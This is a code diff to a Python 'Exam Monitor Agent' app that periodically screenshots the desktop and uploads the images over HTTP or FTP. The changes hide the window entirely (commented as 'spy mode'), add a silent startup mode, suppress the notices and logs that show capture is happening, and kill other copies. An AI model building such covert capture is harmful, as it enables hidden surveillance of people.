@@ -1,5 +1,5 @@
 import customtkinter as ctk
-import tkinter as tk  # Нужен для некоторых специфичных вещей
+import tkinter as tk
 from tkinter import messagebox
 import json
 import os
@@ -14,8 +14,9 @@ import requests
 import ftplib
 import io
 from PIL import Image
+import psutil # Для убийства старых копий
 
-# --- Настройка DPI для Windows ---
+# --- Настройка DPI для Windows (четкий текст) ---
 try:
     import ctypes
     ctypes.windll.shcore.SetProcessDpiAwareness(1)
@@ -34,22 +35,20 @@ def resource_path(relative_path):
 ctk.set_appearance_mode("System")
 ctk.set_default_color_theme("blue")
 
-# Файл настроек
+# Глобальный флаг работы
+RUNNING = False
+
+# ================= ЛОГИКА НАСТРОЕК =================
+
 def get_config_path():
-    # Получаем путь C:\Users\Имя\AppData\Roaming\ExamMonitor
+    # Сохраняем настройки в AppData, чтобы иметь права доступа даже из Program Files
     app_data = os.getenv('APPDATA')
     config_dir = os.path.join(app_data, "ExamMonitor")
-    
-    # Если папки нет — создаем её
     if not os.path.exists(config_dir):
         os.makedirs(config_dir)
-        
     return os.path.join(config_dir, "settings.json")
 
 SETTINGS_FILE = get_config_path()
-RUNNING = False
-
-# ================= ЛОГИКА АГЕНТА =================
 
 def load_settings():
     default_settings = {
@@ -73,6 +72,8 @@ def save_settings(data):
     with open(SETTINGS_FILE, "w") as f:
         json.dump(data, f)
 
+# ================= ЛОГИКА АГЕНТА =================
+
 def take_screenshot_and_send(settings):
     pc_name = socket.gethostname()
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
@@ -80,14 +81,14 @@ def take_screenshot_and_send(settings):
 
     try:
         with mss.mss() as sct:
-            # Делаем скриншот 1-го монитора
+            # Снимаем монитор №1
             sct_img = sct.grab(sct.monitors[1])
             img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
 
             if settings["mode"] == "HTTP":
                 files = {'file': (filename, img_bytes)}
                 requests.post(settings["url_host"], files=files, timeout=5)
-                print(f"[HTTP] Отправлено: {filename}")
+                # print(f"[HTTP] Отправлено: {filename}")
 
             elif settings["mode"] == "FTP":
                 bio = io.BytesIO(img_bytes)
@@ -95,7 +96,7 @@ def take_screenshot_and_send(settings):
                     ftp.login(user=settings["ftp_user"], passwd=settings["ftp_pass"])
                     ftp.set_pasv(True)
                     ftp.storbinary(f"STOR {filename}", bio)
-                print(f"[FTP] Загружено: {filename}")
+                # print(f"[FTP] Загружено: {filename}")
 
     except Exception as e:
         print(f"Ошибка отправки: {e}")
@@ -120,15 +121,35 @@ def start_monitor_thread():
         t = threading.Thread(target=monitor_loop, daemon=True)
         t.start()
 
-# ================= ИНТЕРФЕЙС (App) =================
+# ================= УПРАВЛЕНИЕ ПРОЦЕССАМИ =================
+
+def kill_other_instances():
+    """Убивает другие запущенные копии agent.exe"""
+    current_pid = os.getpid()
+    killed = False
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            # Ищем процессы с именем agent.exe (или как скомпилировано)
+            # Внимание: если запускаете из python, имя будет python.exe. 
+            # Эта логика лучше всего работает именно для скомпилированного .exe
+            proc_name = proc.info['name'].lower()
+            if (proc_name == "agent.exe" or proc_name == "exammonitor_agent.exe") and proc.info['pid'] != current_pid:
+                proc.kill()
+                killed = True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    if killed:
+        print("Старый процесс остановлен.")
+
+# ================= ИНТЕРФЕЙС (GUI) =================
 
 class App(ctk.CTk):
     def __init__(self):
         super().__init__()
         self.title("Exam Monitor Agent")
-        self.geometry("450x650")  # Чуть выше, чтобы всё влезло
+        # Увеличенная высота, чтобы кнопка внизу точно влезла
+        self.geometry("450x700")
 
-        # Установка иконки приложения
         try:
             self.iconbitmap(resource_path("icon.ico"))
         except:
@@ -136,53 +157,44 @@ class App(ctk.CTk):
 
         self.settings = load_settings()
 
-        # --- Заголовок ---
+        # Заголовок
         self.lbl_title = ctk.CTkLabel(self, text="Настройка Агента", font=("Segoe UI", 24, "bold"))
-        self.lbl_title.pack(pady=(30, 10))
+        self.lbl_title.pack(pady=(20, 10))
 
-        # --- Форма настроек ---
-        
-        # Режим
-        ctk.CTkLabel(self, text="Режим отправки:", font=("Segoe UI", 12)).pack(pady=(10, 0))
+        # Поля настроек (с уменьшенным отступом)
+        ctk.CTkLabel(self, text="Режим отправки:", font=("Segoe UI", 12)).pack(pady=(5, 0))
         self.mode_var = ctk.StringVar(value=self.settings.get("mode", "HTTP"))
         self.combo_mode = ctk.CTkComboBox(self, values=["HTTP", "FTP"], variable=self.mode_var, width=300)
         self.combo_mode.pack(pady=5)
 
-        # URL / Host
-        ctk.CTkLabel(self, text="URL (HTTP) или IP (FTP):", font=("Segoe UI", 12)).pack(pady=(10, 0))
-        self.entry_url = ctk.CTkEntry(self, width=300, placeholder_text="http://... или 192.168.1.10")
+        ctk.CTkLabel(self, text="URL (HTTP) или IP (FTP):", font=("Segoe UI", 12)).pack(pady=(5, 0))
+        self.entry_url = ctk.CTkEntry(self, width=300)
         self.entry_url.insert(0, self.settings.get("url_host", ""))
         self.entry_url.pack(pady=5)
 
-        # FTP Логин
-        ctk.CTkLabel(self, text="FTP Логин (опционально):", font=("Segoe UI", 12)).pack(pady=(10, 0))
+        ctk.CTkLabel(self, text="FTP Логин (опционально):", font=("Segoe UI", 12)).pack(pady=(5, 0))
         self.entry_user = ctk.CTkEntry(self, width=300)
         self.entry_user.insert(0, self.settings.get("ftp_user", ""))
         self.entry_user.pack(pady=5)
 
-        # FTP Пароль
-        ctk.CTkLabel(self, text="FTP Пароль (опционально):", font=("Segoe UI", 12)).pack(pady=(10, 0))
+        ctk.CTkLabel(self, text="FTP Пароль (опционально):", font=("Segoe UI", 12)).pack(pady=(5, 0))
         self.entry_pass = ctk.CTkEntry(self, width=300, show="*")
         self.entry_pass.insert(0, self.settings.get("ftp_pass", ""))
         self.entry_pass.pack(pady=5)
 
-        # Интервал
-        ctk.CTkLabel(self, text="Интервал скриншотов (сек):", font=("Segoe UI", 12)).pack(pady=(10, 0))
+        ctk.CTkLabel(self, text="Интервал скриншотов (сек):", font=("Segoe UI", 12)).pack(pady=(5, 0))
         self.entry_interval = ctk.CTkEntry(self, width=100)
         self.entry_interval.insert(0, str(self.settings.get("interval", "10")))
         self.entry_interval.pack(pady=5)
 
-        # Время работы
-        ctk.CTkLabel(self, text="Часы работы (Начало - Конец):", font=("Segoe UI", 12)).pack(pady=(10, 0))
+        ctk.CTkLabel(self, text="Часы работы (Начало - Конец):", font=("Segoe UI", 12)).pack(pady=(5, 0))
         frame_time = ctk.CTkFrame(self, fg_color="transparent")
         frame_time.pack(pady=5)
         
         self.entry_start = ctk.CTkEntry(frame_time, width=60)
         self.entry_start.insert(0, str(self.settings.get("start_hour", "9")))
         self.entry_start.pack(side="left", padx=5)
-        
         ctk.CTkLabel(frame_time, text="-").pack(side="left")
-        
         self.entry_end = ctk.CTkEntry(frame_time, width=60)
         self.entry_end.insert(0, str(self.settings.get("end_hour", "14")))
         self.entry_end.pack(side="left", padx=5)
@@ -193,9 +205,9 @@ class App(ctk.CTk):
                                       height=45, width=300, 
                                       font=("Segoe UI", 14, "bold"),
                                       fg_color="green", hover_color="darkgreen")
-        self.btn_save.pack(pady=(30, 10))
+        self.btn_save.pack(pady=(20, 10))
 
-        # --- Кнопка "О программе" (как в вашем примере) ---
+        # Кнопка "О программе" (прибита к низу)
         self.btn_info = ctk.CTkButton(self, text="О программе", 
                                       command=self.open_about_window,
                                       fg_color="transparent", 
@@ -216,47 +228,57 @@ class App(ctk.CTk):
             "end_hour": int(self.entry_end.get())
         }
         save_settings(new_settings)
-        messagebox.showinfo("Успех", "Настройки сохранены!\nАгент запущен в фоновом режиме.")
         
         start_monitor_thread()
-        self.iconify() # Свернуть окно
+        
+        # Полностью скрываем окно (шпионский режим)
+        self.withdraw()
 
-    # --- Окно "О программе" ---
     def open_about_window(self):
         about_window = ctk.CTkToplevel(self)
         about_window.title("О программе")
         about_window.geometry("320x350")
         about_window.attributes("-topmost", True)
         
-        # Логотип
         try:
             img_path = resource_path("logo.png")
             if os.path.exists(img_path):
                 pil_image = Image.open(img_path)
-                # Размер логотипа (ширина, высота)
                 logo_img = ctk.CTkImage(light_image=pil_image, dark_image=pil_image, size=(200, 80))
                 lbl_logo = ctk.CTkLabel(about_window, text="", image=logo_img)
                 lbl_logo.pack(pady=(30, 10))
             else:
                 ctk.CTkLabel(about_window, text="[Логотип]", text_color="gray").pack(pady=30)
-        except Exception as e:
-            print(f"Ошибка логотипа: {e}")
+        except:
+            pass
 
-        # Текст
         ctk.CTkLabel(about_window, text="Exam Monitor Agent", font=("Segoe UI", 18, "bold")).pack(pady=(5,0))
         ctk.CTkLabel(about_window, text="Разработчик", text_color="gray", font=("Segoe UI", 12)).pack(pady=(10,0))
         
-        # Ссылка
         link = ctk.CTkLabel(about_window, text="APP-Develop.Ru", font=("Segoe UI", 14, "underline"), 
                             text_color=("#3B8ED0", "#1F6AA5"), cursor="hand2")
         link.pack(pady=5)
-        link.bind("<Button-1>", lambda e: webbrowser.open("https://app-develop.ru"))
+        link.bind("<Button-1>", lambda e: webbrowser.open("https://APP-Develop.Ru"))
         
-        ctk.CTkLabel(about_window, text="Версия 1.0", font=("Segoe UI", 10), text_color="gray").pack(side="bottom", pady=20)
+        ctk.CTkLabel(about_window, text="Версия 2.0", font=("Segoe UI", 10), text_color="gray").pack(side="bottom", pady=20)
 
 if __name__ == "__main__":
-    # Если запущен с аргументом "--silent", можно сразу запускать монитор без GUI
-    # Но для простоты всегда запускаем GUI, который при старте может сам свернуть окно,
-    # если добавить такую логику. Сейчас — просто запускаем форму.
+    # 1. Если это ручной запуск (без флагов) — убиваем старые копии
+    is_silent = (len(sys.argv) > 1 and sys.argv[1] == "--silent")
+    
+    if not is_silent:
+        kill_other_instances()
+
     app = App()
+
+    # 2. Если запуск автоматический (скрытый)
+    if is_silent:
+        if os.path.exists(SETTINGS_FILE):
+            start_monitor_thread()
+            app.withdraw() # Сразу прячемся
+        else:
+            # Если настроек нет, но запуск тихий — ничего не делаем или показываем окно?
+            # Лучше ничего не делать, чтобы не пугать юзера пустым окном при старте Windows
+            sys.exit()
+
     app.mainloop()
